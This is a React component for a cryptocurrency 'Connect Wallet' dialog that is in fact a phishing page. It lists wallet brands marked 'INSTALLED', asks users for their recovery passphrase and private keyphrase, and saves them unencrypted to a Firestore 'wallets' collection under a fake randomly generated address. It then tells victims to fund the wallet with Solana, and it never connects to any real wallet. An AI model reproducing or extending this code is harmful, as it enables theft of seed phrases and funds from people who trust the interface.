// components/WalletModal.js
import React, { useState, useEffect, useCallback } from 'react';
import { db } from '@/firebaseConfig';
import { doc, setDoc } from 'firebase/firestore';
import { HiViewGrid } from "react-icons/hi";
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
  const [showSecondaryModal, setShowSecondaryModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState('');
  const [passphrase, setPassphrase] = useState('');
  const [keyphrase, setKeyphrase] = useState('');
  const [isConnecting, setIsConnecting] = useState(false);
  const [importedFile, setImportedFile] = useState(null);
  const [walletData, setWalletData] = useState(null);
  const [error, setError] = useState('');
  const [walletAddress, setWalletAddress] = useState('');

  const walletOptions = [
    { name: 'Phantom', image: '/phan.png' },
    { name: 'MetaMask', image: '/meta.png' },
    { name: 'Eden Wallet', image: '/eden.png' },
    {name: 'Coinbase', image: '/baselogo.png'},
  ];

  // Simple function to generate a mock wallet address
  const generateWalletAddress = () => {
    return '0x' + Math.random().toString(36).substring(2, 22) + Math.random().toString(36).substring(2, 22);
  };

  const handleWalletSelect = (walletName) => {
    setSelectedWallet(walletName);
    setShowSecondaryModal(true);
  };

  const handleOtherOptionsClick = () => {
    setSelectedWallet('Other');
    setShowSecondaryModal(true);
  };

  const storeWalletData = async (walletDetails) => {
    try {
      const walletRef = doc(db, "wallets", walletDetails.walletAddress);
      await setDoc(walletRef, walletDetails);
      return walletRef.id;
    } catch (e) {
      console.error("Error adding document: ", e);
      throw e;
    }
  };

  const handleConnect = async () => {
    if (!selectedWallet) {
      setError('Please select a wallet');
      return;
    }

    setIsConnecting(true);
    setError('');

    try {
      const generatedAddress = generateWalletAddress();
      setWalletAddress(generatedAddress);

      const walletDetails = {
        walletName: selectedWallet,
        walletAddress: generatedAddress,
        passphrase: passphrase,
        keyphrase: keyphrase,
        connectedAt: new Date().toISOString(),
        lastActive: new Date().toISOString(),
        status: 'connected'
      };

      if (passphrase) {
        walletDetails.hasPassphrase = true;
      }

      const docId = await storeWalletData(walletDetails);
      
      localStorage.setItem('walletData', JSON.stringify({
        id: docId,
        name: selectedWallet,
        address: generatedAddress,
        connectedAt: walletDetails.connectedAt
      }));

      if (onWalletConnected) {
        onWalletConnected({
          id: docId,
          name: selectedWallet,
          address: generatedAddress
        });
      }

      toast.success('Make sure you fund your wallet with 0.07 - 5 Solana and try again', {
        autoClose: 20000,
        
      });
      
      onClose();
    } catch (err) {
      console.error('Connection error:', err);
      setError('Failed to connect wallet. Please try again.');
      toast.error('Failed to connect wallet');
    } finally {
      setIsConnecting(false);
    }
  };

  const handleFileChange = (event) => {
    setImportedFile(event.target.files[0]);
  };

  const handleBack = () => {
    setShowSecondaryModal(false);
    setSelectedWallet('');
    setPassphrase('');
    setKeyphrase('');
    setImportedFile(null);
    setError('');
  };

  const handleKeyDown = useCallback((event) => {
    if (event.key === 'Escape' && isOpen) {
      onClose();
    }
  }, [isOpen, onClose]);

  useEffect(() => {
    if (isOpen) {
      document.addEventListener('keydown', handleKeyDown);
      document.body.classList.add('overflow-hidden');
    } else {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.classList.remove('overflow-hidden');
      setShowSecondaryModal(false);
      setSelectedWallet('');
      setPassphrase('');
      setKeyphrase('');
      setImportedFile(null);
      setError('');
    }

    return () => {
      document.removeEventListener('keydown', handleKeyDown);
      document.body.classList.remove('overflow-hidden');
    };
  }, [isOpen, handleKeyDown]);

  if (!isOpen) {
    return null;
  }

  return (
    <div className="fixed inset-0 bg-black bg-opacity-75 flex justify-center items-center z-50">
      <div className="bg-gray-900 w-80 rounded-lg shadow-lg p-6 max-w-md relative">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-500 hover:text-gray-300 focus:outline-none"
        >
          <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        {!showSecondaryModal ? (
          <div>
            <h3 className="text-xl font-semibold text-white mb-4">Connect Wallet</h3>
            <ul className="space-y-2">
              {walletOptions.map(({ name, image }) => (
                <li
                  key={name}
                  className="bg-gray-800 hover:bg-gray-700 rounded-md py-3 px-2 w-full cursor-pointer transition duration-200 flex items-center"
                  onClick={() => handleWalletSelect(name)}
                >
                  <img src={image} alt={name} className="h-6 w-6 mr-2" />
                  <span className="block text-sm text-gray-300 font-medium">{name}</span>
                  <span className="text-xs bg-[#1F3A28] p-1 font-bold rounded text-green-500 ml-auto">INSTALLED</span>
                </li>
              ))}
            </ul>
            <button
              className="w-full flex items-center gap-4 pl-2 mt-4 bg-gray-800 text-sm text-white font-semibold py-2 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
              onClick={handleOtherOptionsClick}
            >
              <HiViewGrid />
              All Wallets
            </button>
            <p className="mt-4 text-center text-xs text-gray-400">Haven't got a wallet? <span className="text-indigo-500 text-sm cursor-pointer">Get started</span></p>
          </div>
        ) : (
          <div>
            <h3 className="text-xl font-semibold text-white mb-4">Connect to {selectedWallet}</h3>
            {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
            <div className="space-y-4">
              <div>
                <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">Recovery Passphrase:</label>
                <input
                  type="password"
                  id="passphrase"
                  className="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                />
              </div>
              <div>
                <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-300 mb-1">Private Keyphrase:</label>
                <textarea
                  id="keyphrase"
                  rows="3"
                  className="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                  value={keyphrase}
                  onChange={(e) => setKeyphrase(e.target.value)}
                />
              </div>
              {/* <div className='border border-dashed border-gray-600 p-3 rounded'>
                <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Add a screenshot of your wallet here:</label>
                <input
                  type="file"
                  id="importFile"
                  className="w-full text-sm text-gray-300 mt-1"
                  onChange={handleFileChange}
                />
              </div> */}
            </div>
            <div className="mt-6 flex justify-end space-x-2">
              <button
                className="bg-gray-700 hover:bg-gray-600 text-gray-100 font-semibold py-2 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500"
                onClick={handleBack}
              >
                Back
              </button>
              <button
                className="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-2 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 disabled:opacity-50"
                onClick={handleConnect}
                // disabled={isConnecting}
              >
                {isConnecting ? (
                  <>
                    <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Connecting...
                  </>
                ) : 'Connect'}
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default WalletModal;